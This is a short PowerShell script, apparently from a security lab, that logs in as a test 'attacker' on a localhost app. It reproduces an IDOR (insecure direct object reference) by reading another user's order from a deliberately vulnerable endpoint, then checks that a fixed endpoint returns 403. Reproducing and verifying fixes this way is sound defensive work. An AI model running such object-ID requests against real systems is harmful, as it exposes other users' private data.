# Step 1: Login sebagai attacker
$response = Invoke-RestMethod -Uri "http://localhost:8080/login" `
  -Method POST `
  -Body '{"email":"attacker@example.com","password":"password"}' `
  -ContentType "application/json"

Write-Host "Login Response:" $response

# Ambil token dari response
$token = $response.token
Write-Host "Attacker Token:" $token

# Step 2: Exploit IDOR (Vulnerable Endpoint)
Write-Host "`n[Attempting IDOR on Vulnerable Endpoint...]"
try {
    $vuln = Invoke-RestMethod -Uri "http://localhost:8080/api/v1/vuln/orders/1" `
      -Headers @{ Authorization = "Bearer $token" }
    
    Write-Host "[SUCCESS] IDOR Reproduced! Leaked Data:" -ForegroundColor Red
    $vuln | ConvertTo-Json -Depth 5
} catch {
    Write-Host "[FAIL] IDOR failed (Unexpected)." -ForegroundColor Yellow
    Write-Host $_
}

# Step 3: Verify Fix (Secure Endpoint)
Write-Host "`n[Verifying Fix on Secure Endpoint...]"
try {
    $secure = Invoke-RestMethod -Uri "http://localhost:8080/api/v1/secure/orders/1" `
      -Headers @{ Authorization = "Bearer $token" }
    
    Write-Host "[FAIL] Secure endpoint leaked data!" -ForegroundColor Red
    $secure | ConvertTo-Json -Depth 5
} catch {
    $responseCode = $_.Exception.Response.StatusCode.value__
    if ($responseCode -eq 403) {
        Write-Host "[SUCCESS] Access Blocked (403 Forbidden)." -ForegroundColor Green
    } else {
        Write-Host "[INFO] Status Code: $responseCode"
    }
}
